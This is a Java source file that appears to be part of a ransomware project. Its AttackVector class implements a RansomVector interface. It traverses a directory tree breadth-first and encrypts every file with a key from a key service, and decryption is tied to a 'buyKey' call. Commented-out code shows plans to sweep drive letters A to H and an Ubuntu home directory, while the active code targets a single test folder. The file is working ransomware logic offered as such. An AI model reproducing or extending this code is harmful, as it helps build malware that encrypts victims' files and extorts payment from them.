package Agent.Attack;

import java.io.File;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Map;

import Agent.EncryptionAlgo.CryptoAlgorithm;
import Agent.cryptFile.CryptoOperation;
import Agent.cryptFile.DecryptFile;
import Agent.cryptFile.EncryptFile;
import Agent.entites.AlgorithmsMap;
import Agent.entites.CryptoKey;
import Agent.exceptions.AttackVectorException;
import Agent.exceptions.CryptOperationException;
import Agent.exceptions.CryptoException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector implements RansomVector {
	private KeyService keyService;

	@Override
	public void encryptFileSystem() throws AttackVectorException {
		try {
			keyService = new KeyService();
			cryptFileSystem(keyService.getKey(), new EncryptFile());
		} catch (CryptoException e) {
			throw new AttackVectorException("Encrypting the file-system failed", e.getCause());
		}
	}

	@Override
	public void decryptFileSystem() throws AttackVectorException {
		try {
			cryptFileSystem(keyService.buyKey(), new DecryptFile());
		} catch (CryptoException e) {
			throw new AttackVectorException("Decrypting the file-system failed", e.getCause());
		}
	}

	private void cryptFileSystem(CryptoKey key, CryptoOperation cryptFunc) throws AttackVectorException {
		// Traverse<File> dfs = new DFS<File>();
		// or
		Traverse<File> bfs = new BFS<File>();
		bfs.init();
		Collection<File> visitedFolders = new ArrayList<File>();
		// WINDOWS
		// for (char i = 'A'; i <= 'H'; i++) {
		try {
			traverseAndCrypt("C:\\Users\\HP\\Desktop\\god", visitedFolders, key, bfs, cryptFunc);
		} catch (CryptoException e) {
			throw new AttackVectorException("Could not crypt the whole file-system", e.getCause());
		}
		// }
		// UBUNTU
		// try {
		// traverseAndCrypt("/home/osher/Desktop", visitedFolders, key, bfs, cryptFunc);
		// } catch (CryptoException e) {
		// throw new AttackVectorException("Could not crypt the whole file-system",
		// e.getCause());
		// }
	}

	private CryptoAlgorithm getCryptClass(Map<String, CryptoAlgorithm> algorithmMap, String className) {
		return algorithmMap.get(className);
	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	private void traverseAndCrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse<File> struct,
			CryptoOperation cryptoFunc) throws CryptoException {

		CryptoAlgorithm crypto = getCryptClass(AlgorithmsMap.getMap(), key.getAlgorithm());
		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = (File) struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}
					} else if (file.isFile()) {
						try {
							cryptoFunc.operate(key, file, crypto);
						} catch (CryptOperationException e) {
							throw new CryptoException("Could not crypt", e.getCause());
						}

					}
				}
			}

		}
	}
}
